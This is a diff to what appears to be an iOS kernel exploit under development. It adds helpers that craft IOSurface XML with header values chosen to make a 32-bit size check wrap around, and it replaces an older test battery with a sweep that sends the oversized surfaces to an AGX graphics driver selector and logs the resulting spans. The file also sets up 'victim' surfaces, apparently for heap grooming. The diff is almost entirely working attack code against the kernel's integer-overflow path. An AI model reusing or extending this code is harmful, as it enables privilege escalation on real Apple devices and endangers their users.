@@ -132,6 +132,30 @@ static NSString *f1_xml2(uint32_t slices, uint64_t data, uint64_t hdr) {
 }
 
 static NSString *f1_xml(void) { return f1_xml2(4, 0x4000ULL, 0x40000000ULL); }
+// Header value that makes the 32-bit size check wrap to the plane size while
+// the per-slice data region stays large.
+static uint64_t wrap_hdr(uint32_t slices, uint64_t data, uint64_t plane) {
+    if (slices == 0 || plane % slices) return 0;
+    uint64_t per = plane / slices;
+    uint64_t mod = (1ULL << 32) / slices;
+    uint64_t target = per + mod;
+    if (target < data) return 0;
+    return target - data;
+}
+
+// Same XML as f1_xml2 with plane and alloc sizes overridden.
+static NSString *f1_xml3(uint32_t slices, uint64_t data, uint64_t hdr,
+                         uint64_t planeSize, uint64_t allocSize) {
+    NSString *s = f1_xml2(slices, data, hdr);
+    NSString *planeOld = @"<key>IOSurfacePlaneSize</key><integer>65536</integer>";
+    NSString *planeNew = [NSString stringWithFormat:@"<key>IOSurfacePlaneSize</key><integer>%llu</integer>", (unsigned long long)planeSize];
+    NSString *allocOld = @"<key>IOSurfaceAllocSize</key><integer>65536</integer>";
+    NSString *allocNew = [NSString stringWithFormat:@"<key>IOSurfaceAllocSize</key><integer>%llu</integer>", (unsigned long long)allocSize];
+    s = [s stringByReplacingOccurrencesOfString:planeOld withString:planeNew];
+    s = [s stringByReplacingOccurrencesOfString:allocOld withString:allocNew];
+    return s;
+}
+
 
 // Raw IOSurfaceRoot selector 0 (the same in-band XML path used by the kernel parser).
 static uint32_t create_surface(io_connect_t conn, NSString *xml, const char *tag) {
@@ -228,10 +252,10 @@ static kern_return_t agx_sel8(io_connect_t ac, uint32_t type, uint32_t flags, ui
     r->v38 = rd64(out + 0x38);
     r->v50 = rd64(out + 0x50);
     if (verbose) {
-        L(@"[TPE] t=0x%u f=0x%x sid=%u kr=0x%x ga=0x%llx span=0x%llx v30=0x%llx",
+        L(@"[TPE] t=0x%x f=0x%x sid=%u kr=0x%x ga=0x%llx span=0x%llx v30=0x%llx",
           type, flags, sid, kr, r->ga, r->span, r->v30);
         if (r->span > 0x10000)
-            L(@"[TPE] *** BIG SPAN t=0x%u f=0x%x span=0x%llx ***", type, flags, r->span);
+            L(@"[TPE] *** BIG SPAN t=0x%x f=0x%x span=0x%llx ***", type, flags, r->span);
         for (size_t o = 0; o < 0x60; o += 8) {
             uint64_t v = rd64(out + o);
             if (v) L(@"[TPEOUT] +0x%02zx = 0x%016llx", o, (unsigned long long)v);
@@ -524,30 +548,37 @@ static void run(void) {
     IOSurfaceRef ios_victims[32];
     int ivc = create_iosurface_victims(ios_victims, 32);
 
-    // ---- selector/geometry battery (connections freed before the Metal stage) ----
+    // ---- geometry sweep: the 32-bit check keeps wrapping to the small plane
+    //      while the per-slice data region grows; span should follow data*slices ----
     io_connect_t acb = agx_open_device();
     if (acb) {
-        struct { uint32_t s; uint64_t h, d; } gc[4];
-        gc[0].s = 8;  gc[0].h = 0x20000000ULL; gc[0].d = 0x2000ULL;
-        gc[1].s = 2;  gc[1].h = 0x80000000ULL; gc[1].d = 0x8000ULL;
-        gc[2].s = 16; gc[2].h = 0x10000000ULL; gc[2].d = 0x1000ULL;
-        gc[3].s = 4;  gc[3].h = 0x40000000ULL; gc[3].d = 0x4000ULL;
-        for (size_t j = 0; j < 4; j++) {
-            char tag[16];
-            snprintf(tag, sizeof(tag), "G%zu", j);
-            uint32_t gsid = create_surface(conn, f1_xml2(gc[j].s, gc[j].d, gc[j].h), tag);
-            if (gsid) {
-                agxsel8_t gr;
-                agx_sel8(acb, 0x82, 0, gsid, 1, &gr);
+        static const uint32_t gsl[7] = { 4, 4, 4, 4, 2, 2, 4 };
+        static const uint64_t gdt[7] = { 0x10000ULL, 0x40000ULL, 0x100000ULL, 0x400000ULL, 0x80000ULL, 0x200000ULL, 0x4000ULL };
+        static const uint64_t gpl[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x100000ULL };
+        static const uint64_t gal[7] = { 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x100000ULL };
+        for (size_t j = 0; j < 7; j++) {
+            uint64_t h = wrap_hdr(gsl[j], gdt[j], gpl[j]);
+            uint32_t gsid = create_surface(conn, f1_xml3(gsl[j], gdt[j], h, gpl[j], gal[j]), "GD");
+            if (!gsid) {
+                L(@"[GD%zu] rejected s=%u d=0x%llx p=0x%llx", j, gsl[j],
+                  (unsigned long long)gdt[j], (unsigned long long)gpl[j]);
+                continue;
             }
-        }
-        for (uint32_t ty = 0x80; ty <= 0x8b; ty++) {
-            agxsel8_t tr;
-            agx_sel8(acb, ty, 0, sid, 1, &tr);
+            IOSurfaceRef gsrf = IOSurfaceLookup(gsid);
+            if (gsrf) {
+                L(@"[GD%zu] s=%u d=0x%llx h=0x%llx p=0x%llx alloc=0x%zx", j, gsl[j],
+                  (unsigned long long)gdt[j], (unsigned long long)h,
+                  (unsigned long long)gpl[j], IOSurfaceGetAllocSize(gsrf));
+                IOSurfaceRelease(gsrf);
+            }
+            agxsel8_t gr;
+            agx_sel8(acb, 0x82, 0, gsid, 1, &gr);
+            L(@"[GD%zu] span=0x%llx obj=0x%llx", j, (unsigned long long)gr.span,
+              (unsigned long long)gr.obj);
         }
         IOServiceClose(acb);
     }
-    // ---- end battery ----
+    // ---- end geometry sweep ----
 
     uint64_t agx_span = 0;
     io_connect_t agx_conn = 0;
